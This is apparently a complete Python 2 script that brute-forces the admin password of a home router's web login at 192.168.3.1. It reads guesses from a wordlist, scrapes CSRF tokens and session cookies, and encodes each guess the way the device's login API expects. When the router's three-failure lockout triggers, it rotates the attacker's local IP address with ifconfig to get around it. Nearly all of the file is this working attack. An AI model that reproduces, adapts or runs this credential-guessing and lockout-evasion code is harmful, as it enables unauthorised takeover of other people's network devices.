
import urllib
import json
import urllib2
import hashlib
import base64
import cookielib
import re
import os
import random
import time


g_cookie_str = '';
g_csrf_param = '';
g_csrf_token = '';



def encrpyt_password(my_org_pass):
	# print my_org_pass
	# 256
	hash_256 = hashlib.sha256()
	hash_str = my_org_pass
	hash_256.update(hash_str.encode('utf-8'))
	hash_256_value = hash_256.hexdigest()
	# print hash_256_value

	#base64
	encodestr = base64.b64encode(hash_256_value.encode('utf-8'))
	# print encodestr

	return encodestr
	pass;

def read_dic_from_file(path_str):
	filename = path_str
	pos = []
	Efield = []
	with open(filename, 'r') as file_to_read:
		while True:
			lines = file_to_read.readline() 
			if not lines:
				break
				pass
			lines = lines.replace('\n','')
			lines = lines.replace('\r','')
			lines = lines.replace('\r\n','')
			pos.append(lines)
			pass
	return pos;

	pass;

def change_my_ip(c_ip):
	#ifconfig eth0 192.168.3.x/24
	ip_last=c_ip
	cmd = 'ifconfig eth1 192.168.3.' + str(ip_last);
	a = os.popen(cmd);

	pass;



def get_csrf_str(res_str):

	global g_csrf_param,g_csrf_token;

	key_param = r"<meta name=\"csrf_param\" content=\".+\"/>"
	key_token = r"<meta name=\"csrf_token\" content=\".+\"/>"
	pattern_key_param = re.compile(key_param)
	pattern_token_param = re.compile(key_token)

	key_param_str = pattern_key_param.findall(res_str)[0];
	key_token_str = pattern_token_param.findall(res_str)[0];


	key_cnt_s = "content=\"";
	key_cnt_e = "\"/>";

	param_start = key_param_str.find(key_cnt_s);
	param_end = key_param_str.find(key_cnt_e);
	g_csrf_param = key_param_str[param_start+len(key_cnt_s):param_end];

	token_start = key_token_str.find(key_cnt_s);
	token_end = key_token_str.find(key_cnt_e);
	g_csrf_token = key_token_str[token_start+len(key_cnt_s):token_end];

	pass;


def get_cookie_str(res_info):

	global g_cookie_str;

	t_cookie_index = str(res_info['Set-Cookie']).find(';');
	t_cookie = res_info['Set-Cookie'][0:t_cookie_index];
	g_cookie_str = t_cookie + ';'

	pass;

def parse_result(pass_str,rst_str,fd_other):

	# {"errorCategory":"
	error_param = "\"errorCategory\":\".+\","
	pattern_error_param = re.compile(error_param);
	last_ = pattern_error_param.findall(rst_str);

	if( len(last_) > 0 ):
		out_str = '[' + 'password:' + pass_str + '];' + last_[0] + '\n';
	else:
		out_str = '****[' + 'password:' + pass_str + '];' +rst_str + '\n';
		fd_other.write(out_str);

	print out_str
	return out_str;

	pass;

def get_some_info():

	index_url = 'http://192.168.3.1';
	c_headers = {}
	c_headers['User-Agent'] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Safari/537.36'

	req = urllib2.Request(index_url,headers = c_headers);
	
	try:
		result = urllib2.urlopen(req) # get

		if( 200 == result.getcode() ):
			_res_info = result.info()
			get_cookie_str(_res_info);

			_res = result.read() #
			get_csrf_str(_res) #
		else:
			print 'get_some_info error!'

		result.close()

	except urllib2.HTTPError, e:  
		print "Error Code:", e.code  
	except urllib2.URLError, e:  
		print "Error Reason:", e.reason

	pass;



def check_password(user_str , pass_str , log_handle,fd_other,c_ip):

	host_url = 'http://192.168.3.1/api/system/user_login'

	headers = {}
	headers['Referer'] = 'http://192.168.3.1/';
	headers['User-Agent'] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Safari/537.36'
	headers['Cookie'] = g_cookie_str + 'username =' + user_str;
	headers['Content-Type'] = 'application/json;charset=UTF-8'

	# WS860sWS860sV100R001C02B204SP16E1234567890
	# pass =  base64(sha256(password))
	# encrpyt_password('87654321')
	post_data={ 
			 "csrf":{"csrf_param":g_csrf_param,"csrf_token":g_csrf_token},
			 "data":{"UserName":user_str,"Password":encrpyt_password(pass_str)}
		   };

	post = [] 
	post.append(post_data) 

	data = json.dumps(post_data) #urllib.urlencode(post_data);

	request = urllib2.Request(host_url,headers = headers,data = data)

	try:
		ret_three_time = 0;
		response = urllib2.urlopen(request)

		rst_str = response.read();
		
		if (rst_str.find('user_pass_err') > 0): 
			out_str = '[' + 'password:' + pass_str + '];' +rst_str + '\n';
		elif (rst_str.find('Three_time_err') > 0):
			ret_three_time = 1;
			out_str = '[' + 'password:' + pass_str + '];' +rst_str + '\n';
		else:
			out_str = '****[' + 'password:' + pass_str + '];' +rst_str + '\n';
			fd_other.write(out_str);
		
		if 0 == ret_three_time:
			log_handle.write(out_str);

		response.close()

		print out_str

		return ret_three_time;

	except urllib2.HTTPError, e:  
		print "Error Code:", e.code  
	except urllib2.URLError, e:  
		print "Error Reason:", e.reason

	pass;


def gen_new_ip_num(n_ip):
	n_ip = n_ip + 1;
	if n_ip >= 255:
		n_ip = 3;
	if n_ip < 3:
		n_ip = 3;
	return n_ip;

###############################################################################################
##
##   start 
##
###############################################################################################

def open_packet_log():
	httpHandler = urllib2.HTTPHandler(debuglevel=1)
	httpsHandler = urllib2.HTTPSHandler(debuglevel=1)
	opener = urllib2.build_opener(httpHandler, httpsHandler)
	urllib2.install_opener(opener)
	pass;


def main():

	#open_packet_log();

	worldlist = read_dic_from_file('wordlist2.txt');
	fd_log = open('./log.txt', 'a')
	fd_other = open('./record.txt', 'a')

	no_use_ip = [];
	c_ip = 0;
	for one_password in worldlist:
		pass_str = one_password;
		
		while 1:
			c_ip = gen_new_ip_num(c_ip);
			change_my_ip(c_ip);
			get_some_info();
			r3t = check_password('admin' , pass_str , fd_log,fd_other,c_ip);
			if 1 == r3t:
				no_use_ip.append(c_ip);
				if len(no_use_ip) > 250:
					time.sleep(60);
					no_use_ip = [];
				continue;
			else:
				break;
		pass;


	print 'over '
	fd_other.close();
	fd_log.close();
	pass;

main();









